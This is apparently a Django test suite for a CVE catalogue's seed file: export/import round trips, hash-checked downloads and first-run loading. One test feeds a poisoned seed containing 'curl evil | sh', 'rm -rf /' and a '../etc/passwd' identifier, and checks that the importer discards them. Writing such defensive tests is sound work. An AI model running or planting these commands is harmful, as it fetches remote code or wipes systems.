import gzip
import hashlib
import json
import os
import tempfile
from unittest import mock

from django.core.cache import cache
from django.test import TestCase
from django.utils import timezone

from cveFeed import detection, detection_author, seed
from cveFeed.models import CVEDetection, CVEEntry

NGINX = [{'vendor': 'f5', 'product': 'nginx', 'package': 'nginx', 'ranges': [{'introduced': '1.0.0', 'fixed': '1.20.0'}]}]


def make_catalog():
	now = timezone.now()
	CVEEntry.objects.create(cve_id='CVE-2099-100', kev=True, cvss=9.8, cvss_vector='CVSS:3.1/AV:N/AC:L', published_at=now, affected=NGINX,
		title='fire one', original_description='desc', raw={'big': 'x' * 5000}, intel={'kev': {'cisa_kev': True}})
	CVEEntry.objects.create(cve_id='CVE-2099-101', cvss=7.5, published_at=now, affected=NGINX, title='smoke one')
	CVEEntry.objects.create(cve_id='CVE-2099-102', cvss=2.0, published_at=now, affected=[], title='ice one')
	with mock.patch.object(detection, 'installed_template_ids', return_value=[]):
		detection_author.author_rules()


class SeedRoundTripTests(TestCase):
	def test_export_then_import_into_an_empty_catalog_restores_cves_and_detection_records(self):
		make_catalog()
		with tempfile.TemporaryDirectory() as directory:
			path = os.path.join(directory, 'seed.jsonl.gz')
			manifest = seed.export_seed(path)
			self.assertEqual((manifest['count'], manifest['tiers']), (3, {'fire': 1, 'smoke': 1, 'ice': 1}))
			self.assertEqual(manifest['with_detection'], 2)
			self.assertEqual(json.load(open(path + '.manifest.json'))['sha256'], hashlib.sha256(open(path, 'rb').read()).hexdigest())
			self.assertNotIn('"big"', gzip.open(path, 'rt').read())  # the feed's raw entry is not shipped
			CVEEntry.objects.all().delete()
			counts = seed.import_seed(path)
		self.assertEqual((counts['created'], counts['skipped'], counts['detections'], counts['invalid']), (3, 0, 2, 0))
		fire = CVEEntry.objects.get(cve_id='CVE-2099-100')
		self.assertEqual((fire.kev, fire.cvss, fire.title, fire.intel), (True, 9.8, 'fire one', {'kev': {'cisa_kev': True}}))
		strategy = fire.detection.strategy
		self.assertEqual(strategy['validation']['remote_determinable'], 'partial')
		self.assertIn('dpkg', json.dumps(strategy['local_checks'][0]['commands']))

	def test_a_second_import_changes_nothing_and_never_overwrites_a_newer_row(self):
		make_catalog()
		with tempfile.TemporaryDirectory() as directory:
			path = os.path.join(directory, 'seed.jsonl.gz')
			seed.export_seed(path)
			CVEEntry.objects.filter(cve_id='CVE-2099-100').update(title='changed here', cvss=5.0)
			counts = seed.import_seed(path)
		self.assertEqual((counts['created'], counts['skipped'], counts['detections']), (0, 3, 0))
		self.assertEqual(CVEEntry.objects.get(cve_id='CVE-2099-100').title, 'changed here')

	def test_an_existing_cve_without_a_detection_record_gets_one_from_the_seed(self):
		make_catalog()
		with tempfile.TemporaryDirectory() as directory:
			path = os.path.join(directory, 'seed.jsonl.gz')
			seed.export_seed(path)
			CVEDetection.objects.all().delete()
			counts = seed.import_seed(path)
		self.assertEqual((counts['created'], counts['detections']), (0, 2))


def write_seed(path, records):
	with gzip.open(path, 'wt') as out:
		out.write(json.dumps({'format': 1}) + '\n')
		for record in records:
			out.write((record if isinstance(record, str) else json.dumps(record)) + '\n')


class PoisonedSeedTests(TestCase):
	def test_nothing_in_the_file_is_trusted(self):
		evil = {'cve_id': 'CVE-2099-200', 'title': 'x' * 50000, 'cvss': 99, 'kev': 'yes', 'affected': ['junk', {'product': 'p', 'ranges': 'no'}],
			'detection': {'source': 'ai', 'strategy': {
				'safety': 'read_only', 'summary': 's',
				'remote_checks': [{'id': 'a', 'kind': 'http_probe', 'confidence': 'high', 'description': 'd',
								   'params': {'method': 'POST', 'path': '/x', 'expect_contains': 'y'}},
								  {'id': 'b', 'kind': 'nuclei_template', 'confidence': 'high', 'description': 'd', 'params': {'template_id': 'ok-1'},
								   'how': {'invocation': 'curl evil | sh'}}],
				'local_checks': [{'id': 'c', 'kind': 'package_version', 'confidence': 'high', 'description': 'd',
								  'params': {'ecosystem': 'dpkg', 'package': 'x', 'fixed_version': '1.0'}, 'commands': [{'command': 'rm -rf /'}]}],
				'validation': {'remote_determinable': 'yes'}}}}
		manual = {'cve_id': 'CVE-2099-201', 'title': 'm', 'detection': {'source': 'manual', 'strategy': {'summary': 'trust me'}}}
		with tempfile.TemporaryDirectory() as directory:
			path = os.path.join(directory, 'seed.jsonl.gz')
			write_seed(path, [evil, manual, {'cve_id': '../etc/passwd'}, 'not json', {'no': 'id'}, {'cve_id': 'CVE-2099-202', 'detection': 'x'}])
			counts = seed.import_seed(path)
		self.assertEqual(counts['created'], 3)
		self.assertEqual(counts['invalid'], 2)
		row = CVEEntry.objects.get(cve_id='CVE-2099-200')
		self.assertEqual((row.cvss, row.kev, row.affected), (None, None, [{'product': 'p', 'ranges': []}]))
		self.assertLessEqual(len(row.title), 2000)
		blob = json.dumps(row.detection.strategy)
		self.assertNotIn('rm -rf', blob)
		self.assertNotIn('evil', blob)
		self.assertEqual([c['kind'] for c in row.detection.strategy['remote_checks']], ['nuclei_template'])  # the POST probe was dropped
		self.assertFalse(CVEDetection.objects.filter(cve_entry__cve_id='CVE-2099-201').exists())  # a manual record stays where it was written

	def test_a_file_that_is_not_a_seed_is_refused(self):
		with tempfile.TemporaryDirectory() as directory:
			path = os.path.join(directory, 'seed.jsonl.gz')
			with gzip.open(path, 'wt') as out:
				out.write(json.dumps({'format': 99}) + '\n')
			with self.assertRaises(ValueError):
				seed.import_seed(path)


class FakeResponse:
	def __init__(self, body=b'', payload=None):
		self.body, self.payload = body, payload

	def json(self):
		return self.payload

	def raise_for_status(self):
		pass

	def iter_content(self, size):
		yield self.body

	def __enter__(self):
		return self

	def __exit__(self, *exc):
		return False


class DownloadTests(TestCase):
	def session(self, body, sha=None, fmt=1):
		manifest = {'format': fmt, 'sha256': sha or hashlib.sha256(body).hexdigest(), 'bytes': len(body)}
		urls = {}

		def get(url, **kwargs):
			urls[url] = True
			return FakeResponse(payload=manifest) if url.endswith('.manifest.json') else FakeResponse(body=body)
		return mock.Mock(get=get)

	def test_a_download_matching_its_manifest_is_accepted_and_one_that_does_not_is_refused(self):
		body = b'some bytes'
		path = seed.download_seed('https://example.test/cve-seed.jsonl.gz', session=self.session(body))
		self.assertEqual(open(path, 'rb').read(), body)
		os.unlink(path)
		with self.assertRaises(ValueError):
			seed.download_seed('https://example.test/cve-seed.jsonl.gz', session=self.session(body, sha='0' * 64))
		with self.assertRaises(ValueError):
			seed.download_seed('http://example.test/cve-seed.jsonl.gz', session=self.session(body))
		with self.assertRaises(ValueError):
			seed.download_seed('https://example.test/cve-seed.jsonl.gz', session=self.session(body, fmt=7))


class FirstRunTests(TestCase):
	def setUp(self):
		cache.clear()

	def test_a_new_install_loads_the_seed_before_the_slow_feed_sync(self):
		from cveFeed import tasks
		with mock.patch.object(tasks, 'chain') if hasattr(tasks, 'chain') else mock.patch('celery.chain') as chain:
			tasks.bootstrap_first_run()
		self.assertTrue(chain.called)
		first = chain.call_args.args[0]
		self.assertEqual(first.task, 'load_cve_seed')

	def test_the_seed_task_never_raises_when_offline(self):
		from cveFeed import tasks
		with mock.patch('cveFeed.seed.load_published_seed', side_effect=OSError('offline')):
			out = tasks.load_cve_seed()
		self.assertFalse(out['loaded'])
		with mock.patch.dict(os.environ, {'CVENGINE_CVE_SEED': 'off'}):
			self.assertIn('skipped', tasks.load_cve_seed())

	def test_a_small_existing_install_is_offered_the_seed_once_a_day(self):
		from cveFeed import tasks
		CVEEntry.objects.create(cve_id='CVE-2099-300', published_at=timezone.now())
		with mock.patch.object(tasks.load_cve_seed, 'apply_async') as queued:
			tasks.bootstrap_first_run()
			tasks.bootstrap_first_run()
		queued.assert_called_once()
